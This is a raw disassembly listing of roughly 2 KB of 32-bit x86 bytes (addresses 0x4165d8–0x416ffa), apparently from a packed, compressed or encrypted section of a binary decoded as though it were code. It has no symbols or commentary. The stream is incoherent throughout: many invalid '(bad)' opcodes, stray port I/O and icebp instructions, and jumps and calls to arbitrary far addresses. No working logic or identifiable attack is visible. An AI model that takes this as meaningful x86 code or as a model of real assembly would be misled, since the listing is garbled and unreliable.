  4165d8:	in     eax,dx
  4165d9:	or     DWORD PTR [esi-0xb],edx
  4165dc:	daa    
  4165dd:	loop   0x4165f0
  4165df:	sar    BYTE PTR [edi],0x2
  4165e2:	pop    es
  4165e3:	mov    esi,0x83eb475f
  4165e8:	popf   
  4165e9:	hlt    
  4165ea:	sbb    al,0xc7
  4165ec:	outs   dx,DWORD PTR ds:[esi]
  4165ed:	aas    
  4165ee:	(bad)  
  4165ef:	jnp    0x41660a
  4165f1:	jbe    0x4165f1
  4165f3:	test   BYTE PTR [edi+ebp*8-0x80bc369],dh
  4165fa:	sar    BYTE PTR [ebx],0x13
  4165fd:	mov    WORD PTR [ebx],ss
  4165ff:	jnp    0x416621
  416601:	outs   dx,DWORD PTR ds:[esi]
  416602:	or     eax,0x29c9d23f
  416607:	in     eax,0xc2
  416609:	aam    0x10
  41660b:	jle    0x4165a7
  41660d:	hlt    
  41660e:	cwde   
  41660f:	icebp  
  416610:	xchg   ebp,eax
  416611:	mov    BYTE PTR [esi-0x14],cl
  416614:	ret    0x153e
  416617:	push   ecx
  416618:	inc    edx
  416619:	retf   
  41661a:	dec    edi
  41661b:	or     bh,ah
  41661d:	dec    ebp
  41661e:	test   al,dh
  416620:	popa   
  416621:	std    
  416622:	mov    bh,bh
  416624:	imul   edi,ecx,0x86db6b6a
	...
  416646:	add    BYTE PTR [eax],al
  416648:	and    bh,bh
  41664a:	adc    ebx,esi
  41664c:	xchg   BYTE PTR [esi+0x0],al
  41664f:	mov    dh,0x84
  416651:	or     al,0x6
  416653:	sti    
  416654:	fdivrp st(2),st
  416656:	mov    cl,bh
  416658:	into   
  416659:	cmp    BYTE PTR [ebx-0x6b],dh
  41665c:	loopne 0x41661c
  41665e:	aaa    
  41665f:	sbb    eax,0xde73fbed
  416664:	fptan  
  416666:	je     0x416635
  416668:	push   ss
  416669:	dec    edx
  41666a:	std    
  41666b:	aam    0xd2
  41666d:	or     DWORD PTR [eax-0x17],eax
  416670:	lea    edi,[esp+ecx*1-0x7c0cb6a4]
  416677:	sub    DWORD PTR [edx+0x6],esi
  41667a:	mov    ch,BYTE PTR [ebp-0x1acf0cc2]
  416680:	ds dec eax
  416682:	jae    0x4166db
  416684:	int3   
  416685:	sti    
  416686:	call   FWORD PTR [ebx-0x65b01c6b]
  41668c:	sbb    eax,0x869e56b9
  416691:	inc    esp
  416692:	std    
  416693:	popa   
  416694:	push   ebx
  416695:	bnd data16 jo 0x41662f
  416699:	(bad)  
  41669a:	(bad)  
  41669b:	call   0x5431edae
  4166a0:	push   cs
  4166a1:	icebp  
  4166a2:	std    
  4166a3:	jmp    0xaf80683e
  4166a8:	inc    eax
  4166a9:	aaa    
  4166aa:	retf   0x7b
	...
  4166c9:	add    BYTE PTR [ecx-0x6b9d0f7a],ch
  4166cf:	add    dh,BYTE PTR [esi+0x5b86819c]
  4166d5:	icebp  
  4166d6:	add    BYTE PTR [edi+edx*1],al
  4166d9:	jae    0x4166f2
  4166db:	dec    cl
  4166dd:	jmp    0x974f58af
  4166e2:	int3   
  4166e3:	icebp  
  4166e4:	mov    al,BYTE PTR [eax]
  4166e6:	push   0x9b45fdfb
  4166eb:	jae    0x41670b
  4166ed:	mov    BYTE PTR [eax],dh
  4166ef:	sti    
  4166f0:	or     dh,BYTE PTR [esi+0x4d37ed29]
  4166f6:	cmp    BYTE PTR [edi+0x4],dh
  4166f9:	(bad)  
  4166fa:	icebp  
  4166fb:	in     al,dx
  4166fc:	add    BYTE PTR [esi-0x15],al
  4166ff:	jbe    0x4166cc
  416701:	pop    edi
  416702:	cli    
  416703:	inc    eax
  416704:	(bad)
  416707:	cld    
  416708:	add    ah,BYTE PTR [di]
  41670b:	cld    
  41670c:	(bad)  
  41670d:	(bad)  
  41670e:	adc    BYTE PTR [eax],bl
  416710:	or     BYTE PTR [ebx-0xb0074c],al
  416716:	add    DWORD PTR [eax],esi
  416718:	push   ss
  416719:	inc    eax
  41671a:	in     al,0x86
  41671c:	les    ecx,FWORD PTR [esi+eiz*1]
  41671f:	clc    
  416720:	jmp    DWORD PTR [edi-0xa]
  416723:	add    al,0x0
  416725:	add    BYTE PTR [edi-0x3c],dh
  416728:	add    al,0x50
  41672a:	sbb    ebp,DWORD PTR [eax+0x24]
  41672d:	or     al,0x0
	...
  41674b:	add    BYTE PTR [ebx],bl
  41674d:	or     DWORD PTR [esi+edx*1+0x74],ecx
  416751:	add    edi,DWORD PTR [edi-0x3c]
  416754:	mov    eax,0x3f0004c5
  416759:	in     al,dx
  41675a:	sub    cl,0xa4
  41675d:	ja     0x416769
  41675f:	dec    ecx
  416760:	adc    DWORD PTR [eax*4+0x506cb070],0x7f55e708
  41676b:	shl    BYTE PTR [eax+0x7b51e849],0xf2
  416772:	sti    
  416773:	ret    
  416774:	(bad)  
  416775:	jmp    0x4925:0x7764e980
  41677c:	or     eax,0x7481154d
  416781:	fidiv  DWORD PTR [ebp+0x1]
  416784:	pop    ds
  416785:	cdq    
  416786:	(bad)  
  416787:	mov    DWORD PTR [ebx+0x72],ecx
  41678a:	(bad)  
  41678b:	call   0xfe341ef7
  416790:	ss mov edi,0x721570f2
  416796:	mov    ebx,0x7ee4bdfd
  41679b:	mov    BYTE PTR [esi+0x29e4d9af],0x7e
  4167a2:	bnd jmp 0x502c1be
  4167a8:	ret    
  4167a9:	jno    0x41676a
  4167ab:	call   0xfe33dc64
	...
  4167cc:	add    BYTE PTR [eax],al
  4167ce:	mov    ebp,0xfb83c6d7
  4167d3:	retf   
  4167d4:	push   es
  4167d5:	xor    ebp,ecx
  4167d7:	sbb    DWORD PTR [esi+0x8],edi
  4167da:	mov    ?,WORD PTR [edi]
  4167dc:	add    DWORD PTR [ecx+ebp*1-0x60],esi
  4167e0:	jne    0x416808
  4167e2:	push   esp
  4167e3:	lods   eax,DWORD PTR ds:[esi]
  4167e4:	sbb    al,BYTE PTR [edi+0x61]
  4167e7:	leave  
  4167e8:	cmp    al,0x73
  4167ea:	out    0x61,eax
  4167ec:	xlat   BYTE PTR ds:[ebx]
  4167ed:	mov    edx,ebx
  4167ef:	popa   
  4167f0:	(bad)  
  4167f1:	call   0xfe338e65
  4167f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167f7:	enter  0x5b,0xa6
  4167fb:	ficomp DWORD PTR [ebx-0x1]
  4167fe:	inc    eax
  4167ff:	mov    dh,0x7e
  416801:	leave  
  416802:	mov    ch,0x34
  416804:	in     eax,dx
  416805:	std    
  416806:	call   0xbf62:0x570f219
  41680d:	std    
  41680e:	std    
  41680f:	in     al,0x7e
  416811:	lds    edx,FWORD PTR [esi-0x76234601]
  416817:	jmp    0x4167f7
  416819:	icebp  
  41681a:	fs cld 
  41681c:	imul   eax,esp,0xda625311
  416822:	xchg   esp,eax
  416823:	mov    esi,0xee54f1cf
  416828:	mov    esi,0x62c24b7d
  41682d:	inc    eax
  41682e:	icebp  
  41682f:	add    esp,DWORD PTR [edx-0x5]
	...
  41684e:	add    BYTE PTR [eax],al
  416850:	fdivr  DWORD PTR [eax]
  416852:	xor    BYTE PTR [ecx-0x7c],bl
  416855:	out    dx,eax
  416856:	adc    edx,DWORD PTR [esi]
  416858:	retf   0xf374
  41685b:	pop    ebp
  41685c:	or     al,0x33
  41685e:	mov    ecx,0x2001cb7f
  416863:	stc    
  416864:	sub    al,al
  416866:	xchg   DWORD PTR [esi],eax
  416868:	and    al,0xfc
  41686a:	add    BYTE PTR ds:0x4a5cd23c,al
  416870:	cmova  ebx,DWORD PTR [esi-0xd]
  416874:	mov    edx,0xe553eae0
  416879:	je     0x416841
  41687b:	add    cl,BYTE PTR ds:0xe0874f79
  416881:	je     0x416865
  416883:	jl     0x4168d6
  416885:	and    al,0xeb
  416887:	fld    TBYTE PTR [ecx-0x13]
  41688a:	ss icebp 
  41688c:	mov    es,eax
  41688e:	mov    bl,0x1
  416890:	xchg   esp,eax
  416891:	cmp    al,0xcb
  416893:	adc    ecx,DWORD PTR [esi-0x75fa6c49]
  416899:	jmp    DWORD PTR [ecx-0x37]
  41689c:	mov    ah,0xf8
  41689e:	mov    ch,0xdb
  4168a0:	ss pop ebp
  4168a2:	call   0x9f0144aa
  4168a7:	push   ecx
  4168a8:	iret   
  4168a9:	clc    
  4168aa:	(bad)  
  4168ab:	call   0x6330df94
  4168b0:	add    DWORD PTR [eax+0xe9e7],0x0
	...
  4168d2:	add    dl,BYTE PTR [edi]
  4168d4:	inc    edi
  4168d5:	push   ebp
  4168d6:	sbb    bh,BYTE PTR [edi-0x19]
  4168d9:	jmp    0xbebc:0xa93203e2
  4168e0:	push   ebp
  4168e1:	pop    ds
  4168e2:	fsubr  st,st(1)
  4168e4:	call   0xfe2cc5d7
  4168e9:	push   ss
  4168ea:	push   0x4139fd0e
  4168ef:	js     0x4168bb
  4168f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4168f2:	mov    esi,0xb1a78903
  4168f7:	aad    0xe8
  4168f9:	(bad)  
  4168fa:	cmp    ebx,ebp
  4168fc:	std    
  4168fd:	and    BYTE PTR [ecx],0x80
  416900:	shr    ch,0xb4
  416903:	jbe    0x4168d3
  416905:	xchg   ecx,eax
  416906:	shl    esi,0xfd
  416909:	jbe    0x4168c9
  41690b:	in     al,dx
  41690c:	pop    ebx
  41690d:	stos   BYTE PTR es:[edi],al
  41690e:	fs push ebx
  416910:	mov    ebp,esp
  416912:	xor    bh,ah
  416914:	mov    BYTE PTR [eax-0x75],bl
  416917:	jmp    0x9ce9:0xc021ed73
  41691e:	popa   
  41691f:	clc    
  416920:	adc    BYTE PTR [eax+0xe],0x74
  416924:	xor    eax,0x471f5ab0
  416929:	mov    ebp,0xe2744520
  41692e:	pop    es
  41692f:	jno    0x416918
  416931:	mov    ebx,0x1efbacd6
	...
  416952:	add    BYTE PTR [eax],al
  416954:	mov    ebp,0xe8330d6
  416959:	xlat   BYTE PTR ds:[ebx]
  41695a:	add    al,BYTE PTR [ebx+0x89560f]
  416960:	jmp    0x4169cd
  416962:	retf   0xdbe8
  416965:	fdiv   st(3),st
  416967:	dec    DWORD PTR [edi]
  416969:	and    ebx,edi
  41696b:	jo     0x4169d9
  41696d:	imul   ecx,ebx,0xffffffff
  416970:	aam    0xf7
  416972:	xchg   dh,al
  416974:	pop    esp
  416975:	push   0xfffffff7
  416977:	inc    DWORD PTR [ebx-0x38]
  41697a:	or     DWORD PTR [edx-0x9],edx
  41697d:	ret    
  41697e:	add    al,0x8b
  416980:	jnp    0x4169ea
  416982:	into   
  416983:	call   0x3d4318
  416988:	scas   eax,DWORD PTR es:[edi]
  416989:	les    ebx,FWORD PTR [ebx+0x5e]
  41698c:	jbe    0x416985
  41698e:	dec    DWORD PTR [edx+0x244c692a]
  416994:	cmp    al,0x28
  416996:	dec    eax
  416997:	jne    0x4169cf
  416999:	shl    ebp,cl
  41699b:	push   edi
  41699c:	in     eax,0xcb
  41699e:	mov    DWORD PTR [esi+0x25],ebp
  4169a1:	add    BYTE PTR [edi+0x74dca9f8],al
  4169a7:	pop    ds
  4169a8:	sub    DWORD PTR [eax+0x24],0xc
  4169ac:	outs   dx,DWORD PTR ds:[esi]
  4169ad:	dec    eax
  4169ae:	and    al,0xc
  4169b0:	jg     0x41695d
  4169b2:	xchg   esi,eax
  4169b4:	pop    esp
  4169b5:	push   0xfffb
	...
  4169d6:	inc    ebx
  4169d7:	jns    0x416999
  4169d9:	je     0x4169c9
  4169db:	js     0x4169b4
  4169dd:	je     0x4169c5
  4169df:	ins    BYTE PTR es:[edi],dx
  4169e0:	dec    DWORD PTR [edx+0x5708c72b]
  4169e6:	dec    esp
  4169e7:	jle    0x416a57
  4169e9:	add    DWORD PTR [esi+ebp*1-0x1419a040],esi
  4169f0:	std    
  4169f1:	mov    bh,BYTE PTR [esi+ebp*1+0x5c0d56d2]
  4169f8:	mov    ebx,0xc455fe74
  4169fd:	add    al,0x86
  4169ff:	test   eax,0xf0e9742a
  416a04:	jne    0x416a14
  416a06:	iret   
  416a07:	push   ebp
  416a08:	les    eax,FWORD PTR [esi+eax*2]
  416a0b:	or     BYTE PTR [edx-0x10],dh
  416a0e:	aas    
  416a0f:	cdq    
  416a10:	dec    ebx
  416a11:	ret    0xd909
  416a14:	mov    cl,0xff
  416a16:	ja     0x4169e9
  416a18:	pop    eax
  416a19:	mov    DWORD PTR [ecx+0x58],esi
  416a1c:	fisttp QWORD PTR [esp+ecx*1]
  416a1f:	fld    DWORD PTR [ecx]
  416a21:	push   esi
  416a22:	push   ds
  416a23:	mov    bl,0x7a
  416a25:	inc    ebx
  416a26:	sbb    eax,0xd076c3ee
  416a2b:	push   ebp
  416a2c:	jmp    0x332d2c2e
  416a31:	shl    BYTE PTR [ecx+edx*4+0x2],cl
  416a35:	add    BYTE PTR ds:0x67f48a,cl
	...
  416a57:	add    BYTE PTR [edi],bh
  416a59:	add    DWORD PTR [edx],0x48700d00
  416a5f:	clc    
  416a60:	test   BYTE PTR [eax+esi*8],dl
  416a63:	mov    DWORD PTR [eax-0x37],edx
  416a66:	inc    ecx
  416a67:	cmc    
  416a68:	in     eax,0xcd
  416a6a:	ror    DWORD PTR [ebx-0x40dd9eb8],0x5d
  416a71:	mov    bl,0x53
  416a73:	mov    edx,DWORD PTR [eax-0x1d0214b4]
  416a79:	test   al,0x53
  416a7b:	lds    edx,FWORD PTR [eax-0x2d0214d4]
  416a81:	xlat   BYTE PTR ds:[ebx]
  416a82:	add    DWORD PTR [eax],eax
  416a84:	or     eax,0xc3f8b060
  416a89:	sbb    esi,ebp
  416a8b:	std    
  416a8c:	and    BYTE PTR [eax],al
  416a8e:	aaa    
  416a8f:	sbb    BYTE PTR [ebp+0x0],cl
  416a92:	push   0xffffffeb
  416a94:	stos   BYTE PTR es:[edi],al
  416a95:	jae    0x416a58
  416a97:	push   ebp
  416a98:	mov    al,ds:0x1eeedb74
  416a9d:	clc    
  416a9e:	popf   
  416a9f:	out    dx,al
  416aa0:	(bad)  
  416aa1:	pop    ds
  416aa2:	aad    0x43
  416aa4:	or     eax,0x256d2d27
  416aa9:	sbb    DWORD PTR [edi+edi*8+0x2aef437b],esp
  416ab0:	(bad)  
  416ab1:	sti    
  416ab2:	pop    ebp
  416ab3:	jge    0x416ad1
  416ab5:	rcl    BYTE PTR [eax],0x77
  416ab8:	adc    ebx,edi
  416aba:	jb     0x416a80
	...
  416ad8:	add    BYTE PTR [eax],al
  416ada:	mov    ebx,0xd00a9b8
  416adf:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  416ae1:	fld    DWORD PTR [eax+0x54]
  416ae4:	(bad)  
  416ae5:	loopne 0x416ab9
  416ae7:	push   edx
  416ae8:	ret    0x380c
  416aeb:	je     0x416ae4
  416aed:	js     0x416aa5
  416aef:	neg    DWORD PTR [ebp-0x17a9e6c1]
  416af5:	jle    0x416ac5
  416af7:	jmp    0xed86:0xeac0dc37
  416afe:	mov    DWORD PTR [edi+0x6b8dfef3],edi
  416b04:	jecxz  0x416b09
  416b06:	jle    0x416ae6
  416b08:	aaa    
  416b09:	add    ebx,DWORD PTR [eax-0x49]
  416b0c:	sub    DWORD PTR [eax],eax
  416b0e:	or     eax,0xe0d9272e
  416b13:	push   esi
  416b14:	out    0xec,eax
  416b16:	pop    ecx
  416b17:	and    al,0xf7
  416b19:	in     al,dx
  416b1a:	popa   
  416b1b:	and    al,0xd7
  416b1d:	in     al,dx
  416b1e:	pop    ecx
  416b1f:	and    al,0xd7
  416b21:	in     al,dx
  416b22:	push   ds
  416b23:	sub    BYTE PTR [eax],al
  416b25:	fisttp WORD PTR [esi+0x0]
  416b28:	cmp    DWORD PTR [ebp+0x7d0cfbf2],esp
  416b2e:	leave  
  416b2f:	mov    esi,0xb4a9e90c
  416b34:	add    eax,0x6a0244bf
  416b39:	call   0xd155567c
	...
  416b5a:	add    BYTE PTR [eax],al
  416b5c:	clc    
  416b5d:	aas    
  416b5e:	add    BYTE PTR [edx-0x7f],dh
  416b61:	jg     0x416b61
  416b63:	idiv   dl
  416b65:	and    dh,BYTE PTR [ecx]
  416b67:	sub    ebx,esi
  416b69:	jle    0x416ba8
  416b6b:	jmp    0x416bde
  416b6d:	mov    es,eax
  416b6f:	xor    DWORD PTR [eax+eiz*8+0xc4e6af4],ecx
  416b76:	push   eax
  416b77:	ss ret 
  416b79:	jmp    0x6400:0x3ffba513
  416b80:	dec    esi
  416b81:	je     0x416b8d
  416b83:	pop    ds
  416b84:	xor    BYTE PTR ds:0xffced734,cl
  416b8a:	xor    BYTE PTR [edi+0x3fc67721],0x4c
  416b91:	dec    ebp
  416b92:	mov    DWORD PTR [ebp+0x365138bf],eax
  416b98:	mov    bl,0xa8
  416b9a:	shl    cl,0x11
  416b9d:	mov    ah,0xd8
  416b9f:	mov    edx,0xe14374f9
  416ba4:	pop    esi
  416ba5:	push   ebx
  416ba6:	push   ebp
  416ba7:	outs   dx,BYTE PTR ds:[esi]
  416ba8:	cmp    eax,0xffffff86
  416bab:	in     al,0xe2
  416bad:	cmp    BYTE PTR [ebx+0x61],0xf9
  416bb1:	or     al,0xd4
  416bb3:	cld    
  416bb4:	dec    esi
  416bb5:	add    BYTE PTR [ebx-0x7f079dd7],al
  416bbb:	add    BYTE PTR [esp+ebx*8],bl
  416bbe:	in     eax,0x82
	...
  416bdc:	add    BYTE PTR [eax],al
  416bde:	mov    ah,0xfc
  416be0:	call   DWORD PTR [ebp+0x2f]
  416be3:	jb     0x416bed
  416be5:	jmp    0x416ba1
  416be7:	addr16 inc esi
  416be9:	add    al,0x27
  416beb:	aad    0x2
  416bed:	jne    0x416b93
  416bef:	(bad)  [esi+0x10]
  416bf2:	sti    
  416bf3:	jb     0x416c0d
  416bf5:	call   0x3eb563
  416bfa:	sbb    eax,0x67ebfc42
  416bff:	jg     0x416bf9
  416c01:	pop    ss
  416c02:	add    ebx,ebp
  416c04:	cld    
  416c05:	jbe    0x416c5b
  416c07:	(bad)  [esi+0x18]
  416c0a:	pop    esp
  416c0b:	sub    ebp,DWORD PTR [ecx+0x1]
  416c0e:	je     0x416c7b
  416c10:	inc    ecx
  416c11:	clc    
  416c12:	out    dx,eax
  416c13:	ins    DWORD PTR es:[edi],dx
  416c14:	sbb    al,0x3b
  416c16:	inc    ebx
  416c17:	outs   dx,BYTE PTR ds:[esi]
  416c18:	into   
  416c19:	call   DWORD PTR [ecx]
  416c1b:	in     al,dx
  416c1c:	cld    
  416c1d:	adc    eax,0x400e18
  416c22:	scas   eax,DWORD PTR es:[edi]
  416c23:	ds cld 
  416c25:	sbb    DWORD PTR [edx+0x10c737d4],0xffffffe7
  416c2c:	mov    al,bh
  416c2e:	adc    ch,BYTE PTR [ebx+0x58]
  416c31:	add    cl,BYTE PTR [ebx+ebx*1+0x688bfffb]
  416c38:	lock mov ecx,DWORD PTR [ecx]
  416c3b:	fadd   QWORD PTR [ecx+0x7f1400ff]
  416c41:	inc    BYTE PTR [eax]
	...
  416c5f:	add    BYTE PTR [ebx+0x71],bh
  416c62:	pop    es
  416c63:	ins    WORD PTR es:[edi],dx
  416c65:	cmp    eax,DWORD PTR [edx]
  416c67:	call   0x3d4771
  416c6c:	pop    edi
  416c6d:	in     al,dx
  416c6e:	sti    
  416c6f:	jne    0x416c7e
  416c71:	dec    ebp
  416c72:	fmul   QWORD PTR [edi-0x2fe2797]
  416c78:	pop    eax
  416c79:	inc    ecx
  416c7a:	fadd   QWORD PTR [edi-0x76fe27c7]
  416c80:	retf   
  416c81:	(bad)
  416c85:	sbb    eax,DWORD PTR [eax]
  416c87:	add    BYTE PTR [ebx-0x5a],bl
  416c8a:	jle    0x416c84
  416c8c:	sbb    cl,BYTE PTR [esi+0x1]
  416c8f:	push   0xb
  416c91:	add    DWORD PTR [eax+edx*2],0xffffff9a
  416c95:	in     al,dx
  416c96:	sbb    DWORD PTR [esi],edx
  416c98:	dec    ebp
  416c99:	fnstcw WORD PTR [esi-0x10]
  416c9c:	mov    fs,edi
  416c9e:	jmp    0x8e66:0xc1a9ce74
  416ca5:	xchg   esi,eax
  416ca6:	add    ecx,DWORD PTR ds:0x81399998
  416cac:	ins    DWORD PTR es:[edi],dx
  416cad:	int    0x86
  416caf:	rol    BYTE PTR [ecx],0x29
  416cb2:	push   ecx
  416cb3:	push   esi
  416cb4:	pop    edx
  416cb5:	in     al,dx
  416cb6:	sbb    eax,0x80d8cd16
  416cbb:	rol    al,0xd3
  416cbe:	pop    ebx
  416cbf:	(bad)  
  416cc0:	fsubr  DWORD PTR [ebp+0x3c10]
	...
  416ce2:	and    ebx,DWORD PTR [ecx]
  416ce4:	add    al,0x83
  416ce6:	dec    ebp
  416ce7:	add    eax,0x9500fd0b
  416cec:	adc    BYTE PTR [eax+0xd],al
  416cef:	daa    
  416cf0:	jge    0x416cea
  416cf2:	sbb    ch,ah
  416cf4:	sub    eax,0x52d8cd16
  416cf9:	std    
  416cfa:	and    BYTE PTR [ecx+0x5a0d400f],ch
  416d00:	mov    bh,0xfd
  416d02:	pop    edx
  416d03:	bound  edi,QWORD PTR [edi-0x440031a2]
  416d09:	js     0x416d84
  416d0b:	sbb    al,0x6b
  416d0d:	test   cl,dh
  416d0f:	paddsb mm0,QWORD PTR [ebx]
  416d12:	or     eax,0x167eb64e
  416d17:	rcr    ah,1
  416d19:	inc    ebx
  416d1a:	or     eax,0x2ede3533
  416d1f:	jns    0x416cdd
  416d21:	jae    0x416d25
  416d23:	lods   eax,DWORD PTR ds:[esi]
  416d24:	ret    
  416d25:	jmp    0x3c94:0x4d9de6b0
  416d2c:	xchg   edi,eax
  416d2d:	jle    0x416cb8
  416d2f:	jl     0x416db0
  416d31:	jmp    0xf81e:0xc6d2e698
  416d38:	jno    0x416d72
  416d3a:	or     DWORD PTR [ecx-0x54],edi
  416d3d:	push   edi
  416d3e:	je     0x416d42
  416d40:	pusha  
  416d41:	dec    eax
  416d42:	jmp    0x44ec94
	...
  416d63:	add    BYTE PTR [ecx],cl
  416d65:	add    bh,ah
  416d67:	jbe    0x416cff
  416d69:	pop    ebx
  416d6a:	loop   0x416d55
  416d6c:	pusha  
  416d6d:	push   eax
  416d6e:	aaa    
  416d6f:	jmp    0x44368d72
  416d74:	or     eax,0x8c5c2c79
  416d79:	out    0xe8,eax
  416d7b:	(bad)  [di+0x17]
  416d7f:	ja     0x416d0f
  416d81:	pop    ebx
  416d82:	mov    dl,0xe9
  416d84:	xor    BYTE PTR [edi-0x5a],cl
  416d87:	outs   dx,DWORD PTR ds:[esi]
  416d88:	mov    ecx,0xfb2bf4e6
  416d8d:	aas    
  416d8e:	out    0x2c,eax
  416d90:	into   
  416d91:	push   edi
  416d92:	adc    al,0x27
  416d94:	adc    BYTE PTR [edi+esi*8],bh
  416d97:	jl     0x416de7
  416d99:	jo     0x416d5d
  416d9b:	jle    0x416e06
  416d9d:	in     eax,0x0
  416d9f:	jbe    0x416d85
  416da1:	jb     0x416d49
  416da3:	bound  esi,QWORD PTR [edx]
  416da5:	fs push esi
  416da7:	mov    edi,0x5e6c8167
  416dac:	hlt    
  416dad:	jecxz  0x416e05
  416daf:	fs pop edx
  416db1:	pop    esp
  416db2:	std    
  416db3:	dec    esi
  416db4:	in     al,0x50
  416db6:	push   esi
  416db7:	cs dec edx
  416db9:	pop    esp
  416dba:	std    
  416dbb:	ds mov ah,0x2
  416dbe:	add    cl,ch
  416dc0:	push   cs
  416dc1:	jge    0x416d5e
  416dc3:	shl    DWORD PTR [ebp+0x26fde3],0x0
	...
  416de6:	mov    esp,0xa5e8f87f
  416deb:	jp     0x416e59
  416ded:	push   ss
  416dee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416def:	jecxz  0x416e4e
  416df1:	scas   eax,DWORD PTR es:[edi]
  416df2:	mov    ecx,eax
  416df4:	je     0x416e26
  416df6:	push   ebx
  416df7:	cld    
  416df8:	call   DWORD PTR [ebx+0x57fd401]
  416dfe:	jne    0x416de6
  416e00:	std    
  416e01:	jmp    0xf19ce4df
  416e06:	mov    esp,0x2372f076
  416e0b:	hlt    
  416e0c:	mov    ah,BYTE PTR [edi]
  416e0e:	push   cs
  416e0f:	jg     0x416e08
  416e11:	sub    eax,ebx
  416e13:	ins    BYTE PTR es:[edi],dx
  416e14:	sub    DWORD PTR [ecx-0x64cef846],0x71
  416e1b:	fadd   DWORD PTR [ecx]
  416e1d:	jmp    0x63335930
  416e22:	retf   
  416e23:	mul    DWORD PTR [esi-0x45]
  416e26:	inc    esi
  416e27:	(bad)  
  416e28:	(bad)  
  416e29:	call   0x6139aed5
  416e2e:	retf   
  416e2f:	jecxz  0x416e9b
  416e31:	in     eax,0xb9
  416e33:	js     0x416db8
  416e35:	add    BYTE PTR [esi+edx*8+0x6924fffb],cl
  416e3c:	mov    esp,esi
  416e3e:	sbb    al,0xfb
  416e41:	call   0x3eb165
  416e46:	jns    0x416e37
  416e48:	je     0x416e5f
	...
  416e66:	add    BYTE PTR [eax],al
  416e68:	pop    edi
  416e69:	mov    edi,0x50e6e0bd
  416e6e:	sti    
  416e6f:	jne    0x416e45
  416e71:	ins    DWORD PTR es:[edi],dx
  416e72:	cmp    esp,0x50fbd852
  416e78:	pop    esp
  416e79:	cmp    esp,DWORD PTR [edi+0x1]
  416e7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e7d:	sub    eax,eax
  416e7f:	cmp    ebp,DWORD PTR [ecx-0x14]
  416e82:	mov    cl,BYTE PTR [ebp-0x14]
  416e85:	repz mov edi,0x6a50f523
  416e8b:	add    BYTE PTR [esi-0x77a7700],cl
  416e91:	(bad)  
  416e92:	sti    
  416e93:	jmp    DWORD PTR [edx+eax*2-0x2fa60100]
  416e9a:	adc    DWORD PTR [eax+0x64],eax
  416e9d:	shl    BYTE PTR gs:[ebp+0x58],0x48
  416ea2:	dec    esp
  416ea3:	daa    
  416ea4:	je     0x416ea6
  416ea6:	sti    
  416ea7:	adc    eax,0x3ff604
  416eac:	out    0xa3,eax
  416eae:	sti    
  416eaf:	pop    esi
  416eb0:	pop    ds
  416eb1:	mov    ds:0x81340cc2,eax
  416eb6:	clc    
  416eb7:	(bad)  
  416eb8:	clc    
  416eb9:	icebp  
  416eba:	das    
  416ebb:	test   BYTE PTR [ebx-0x567250d1],0xef
  416ec2:	(bad)  
  416ec3:	push   DWORD PTR [ebx-0x3d]
  416ec6:	cmp    esp,edi
  416ec8:	sbb    esp,0xffffff84
  416ecb:	rol    BYTE PTR [eax],0x0
	...
  416eea:	or     eax,0x8e45fc04
  416eef:	je     0x416ef4
  416ef1:	jb     0x416ee8
  416ef3:	mov    cs,esi
  416ef5:	mov    DWORD PTR [ecx],ecx
  416ef7:	es (bad) 
  416efa:	pusha  
  416efb:	pop    esi
  416efc:	fdivr  st,st(5)
  416efe:	js     0x416ec5
  416f00:	xor    al,al
  416f02:	ja     0x416edd
  416f04:	out    0x73,al
  416f06:	adc    eax,0xda2ad999
  416f0b:	dec    edx
  416f0c:	in     eax,0x81
  416f0e:	aad    0x32
  416f10:	jo     0x416f26
  416f12:	cwde   
  416f13:	lods   al,BYTE PTR ds:[esi]
  416f14:	cmc    
  416f15:	dec    esi
  416f16:	aaa    
  416f17:	fst    DWORD PTR [ecx-0x3b]
  416f1a:	push   eax
  416f1b:	fld    QWORD PTR [ecx-0x1926f300]
  416f21:	adc    ecx,DWORD PTR [ebp-0x1d]
  416f24:	inc    ecx
  416f25:	add    BYTE PTR [eax+0x17],al
  416f28:	cld    
  416f29:	dec    DWORD PTR [edi-0x28b1af5]
  416f2f:	jle    0x416f30
  416f31:	push   ebp
  416f32:	mov    al,ah
  416f34:	or     DWORD PTR [esi],edx
  416f36:	int    0xd8
  416f38:	dec    ebx
  416f39:	std    
  416f3a:	and    BYTE PTR [ebp+0x160d400b],ah
  416f40:	cmc    
  416f41:	mov    ah,0x13
  416f43:	and    bl,BYTE PTR [edx+0xf]
  416f46:	not    esi
  416f48:	push   ecx
  416f49:	std    
  416f4a:	add    BYTE PTR [ecx],al
  416f4c:	push   cs
  416f4d:	inc    eax
	...
  416f6a:	add    BYTE PTR [eax],al
  416f6c:	or     eax,0x4a81e95e
  416f71:	mov    edx,0x98fe256d
  416f76:	pop    ebx
  416f77:	cmp    ebx,0x4d92f6d6
  416f7d:	and    DWORD PTR [ecx+0x6a0021e0],eax
  416f83:	ret    
  416f84:	add    DWORD PTR [eax+0x35],edx
  416f87:	dec    edi
  416f88:	sbb    BYTE PTR ds:0xffcd0dcb,cl
  416f8e:	arpl   bx,ax
  416f90:	xor    esi,0x2c1ee71d
  416f96:	aad    0x43
  416f98:	or     eax,0x84e6a67f
  416f9d:	mov    edx,0x773ec30e
  416fa2:	push   ebx
  416fa3:	sub    cl,0xe7
  416fa6:	push   0xffffffd7
  416fa8:	jno    0x416ff9
  416faa:	(bad)  
  416fab:	leave  
  416fac:	sar    BYTE PTR [esi],1
  416fae:	fild   DWORD PTR [ebx+0x7ae7f844]
  416fb4:	dec    esp
  416fb5:	hlt    
  416fb6:	xchg   esp,eax
  416fb7:	dec    esi
  416fb8:	test   al,dh
  416fba:	mov    esp,0xc3e78df8
  416fbf:	ins    DWORD PTR es:[edi],dx
  416fc0:	adc    eax,0xaa4be956
  416fc5:	(bad)  
  416fc7:	add    ecx,DWORD PTR ds:0x1178e356
  416fcd:	sbb    al,0xc7
  416fcf:	dec    ebx
	...
  416fec:	add    BYTE PTR [eax],al
  416fee:	jne    0x416feb
  416ff0:	test   BYTE PTR [edx],0xd
  416ff3:	dec    edx
  416ff4:	jb     0x416fb4
  416ff6:	fst    QWORD PTR [ebp-0x57]
  416ff9:	inc    esi
  416ffa:	xchg   BYTE PTR [ebx-0x3d],ch
